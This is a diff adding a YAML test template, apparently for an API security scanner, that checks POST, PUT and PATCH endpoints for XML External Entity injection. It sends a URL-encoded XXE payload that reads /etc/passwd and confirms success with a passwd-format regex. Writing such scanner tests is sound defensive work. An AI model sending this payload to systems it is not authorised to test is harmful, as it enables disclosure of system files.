@@ -1,0 +1,121 @@
+id: XXE_URL_ENCODED
+info:
+  name: "XML External Entity (XXE) Vulnerability test with URL Encoded payload in API Endpoints"
+  description: >
+    "This test can be used to detect and mitigate XML External Entity vulnerabilities where 
+    malicious payloads are transmitted via percent-encoded URLs."
+  details: >
+    "This test evaluates the robustness of API endpoints against XXE attacks embedded in URL-encoded XML data."
+  impact: >
+    "Exploiting URL-encoded XXE vulnerabilities can lead to severe information disclosure, system data compromise, and heightened security risks in API interactions."
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: XXE_URL_ENCODED
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://www.akto.io/blog/xml-external-entity-attack"
+    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
+  cwe:
+    - CWE-611
+    - CWE-827
+  cve:
+    - CVE-2022-42745
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  request_headers:
+    for_one:
+      key:
+        contains_either:
+          - content-type
+          - Content-Type
+        extract: headerKey
+  method:
+    contains_either:
+      - POST
+      - PUT
+      - PATCH
+
+wordLists:
+  payloads:
+    - "%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%0A"
+execute:
+  type: single
+  requests:
+    - req:
+        - replace_body:  ${payloads}
+        - modify_header:
+            ${headerKey}: "application/xml"
+validate:
+  response_payload:
+    regex: "^([^:]+):([^:]*):(\\d+):(\\d+):([^:]*):([^:]*):([^:\\n\\r]*)$"
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - Attention Required!
+      - CloudFlare
+      - Sorry, you have been blocked
